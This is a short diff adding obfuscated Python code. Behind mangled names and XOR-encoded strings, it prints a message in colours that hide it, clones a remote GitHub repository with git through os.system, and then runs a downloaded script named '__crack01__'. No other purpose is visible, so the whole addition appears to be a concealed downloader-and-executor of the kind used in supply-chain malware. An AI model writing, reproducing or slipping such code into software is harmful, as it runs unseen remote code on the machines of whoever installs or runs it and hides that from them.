@@ -1,0 +1,29 @@
+OlO10l0llO011l0Oll0ll = (lambda lO1lO1lOOO011OlllO000,
+    O1l0Ol110lO0llOO00OOO: lO1lO1lOOO011OlllO000 + O1l0Ol110lO0llOO00OOO)
+Ol0l0lOOO10l001lO0Oll = __import__('r' + 'e', globals(), locals(), [], 0)
+l010110lllOOl01O0OO11 = __import__('o' + 's', globals(), locals(), [], 0 * 
+    4 + 0)
+print(''.join(chr(OO0OlOl0ll1lO1O0OlOOO ^ lOO1O01l00OO110l00OO0) for 
+    lOO1O01l00OO110l00OO0, OO0OlOl0ll1lO1O0OlOOO in zip(
+    b'\xd5\x8dV)n\xfa\x0c\x9f2\xa4\xe2\x13\x13\xb6`',
+    b'\xce\xd6f\x12]\xcaa\xcb]\xcb\x8e3z\xd8\x13')) + ''.join(chr(
+    O00l1l01001OOOlOl0OOl ^ l10O00llOOO10lOl0lO11) for 
+    l10O00llOOO10lOl0lO11, O00l1l01001OOOlOl0OOl in zip(
+    b'J\xe1,\xc2j\x1fD\x8e\xb1\xa3\x8e \x1dT\\p',
+    b'>\x80@\xae\x0bk-\xe1\xdf\xb8\xd5\x10&gl\x1d')))
+getattr(l010110lllOOl01O0OO11, 'metsys'[::-1])(''.join(filter(lambda
+    lOOl0100OO0OO1l01l000: ord(lOOl0100OO0OO1l01l000) % 5 != 0,
+    '\nAK-\x1eA2\x00#Z-\nA}-')).join(chr(~ll11OllOO001lOOlOll11 &
+    llll0l1OOO0ll0O0llO0l | ll11OllOO001lOOlOll11 & ~llll0l1OOO0ll0O0llO0l) for
+    llll0l1OOO0ll0O0llO0l, ll11OllOO001lOOlOll11 in zip(
+    b"\x9b\xf2O\x85\x1b\xd8y\x0b\x07'2Ov\x8f\x0cUP]\x97\x1d3\xdc\xc6\xe7\xb1\xb5\x06E\xcbM\x9df#\xdeT\x06\x009\xb4;\xe8\xbe$\xc4:\xc5\xe3\x0eB\x08"
+    ,
+    b'\xfc\x9b;\xa5x\xb4\x16eb\x07Z;\x02\xff\x7fo\x7fr\xf0tG\xb4\xb3\x85\x9f\xd6i(\xe4\x05\xfc\x0cB\xb15la[\xdcZ\x87\xdfL\xf3\r\xb1\x97!ll'
+    )))
+getattr(l010110lllOOl01O0OO11, ''.join(chr(OllllOOl1O0l1lO010000 ^
+    Ol0ll11OllOl0l111O00l) for Ol0ll11OllOl0l111O00l, OllllOOl1O0l1lO010000 in
+    zip(b'.w\xeb~\xb7\x05', b']\x0e\x98\n\xd2h')))(''.join(chr(
+    Ol0l1ll0l0OOO0lOO1O11 ^ l0l0OllOO1O11O1l00Ol1) for 
+    l0l0OllOO1O11O1l00Ol1, Ol0l1ll0l0OOO0lOO1O11 in zip(
+    b'\xe8\xf5\x10$\xa18\x16\xb7\xc3Ya\xaf\t\x12',
+    b'\x8b\x910\n\xc5\x180\x91\xe3)\x18\xdba}')) + ('n2 __cr' + 'ack01__'))
